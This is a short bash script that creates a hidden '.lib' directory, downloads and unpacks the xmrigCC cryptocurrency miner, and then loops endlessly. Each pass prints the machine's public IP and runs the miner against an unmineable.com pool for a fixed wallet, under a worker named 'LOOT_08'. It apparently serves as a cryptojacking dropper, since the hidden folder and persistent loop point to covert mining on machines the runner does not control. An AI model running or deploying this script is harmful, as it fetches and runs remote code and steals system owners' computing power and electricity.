#!/bin/bash
mkdir .lib && cd .lib
wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.5/xmrigCC-3.4.5-linux-generic-static-amd64.tar.gz && tar -xvf xmrigCC-3.4.5-linux-generic-static-amd64.tar.gz 
cd miner

while true
do
curl ifconfig.me
./xmrigDaemon -o stratum+tcp://rx.unmineable.com:80 -u BOME:7s5ZfWsLp6zGoBw4gNJhM3ogR3kcyrjen1oSjAL9rbJq.LOOT_08 -p x -a rx/0 -k -t 8 --donate-level 1
sleep 120
done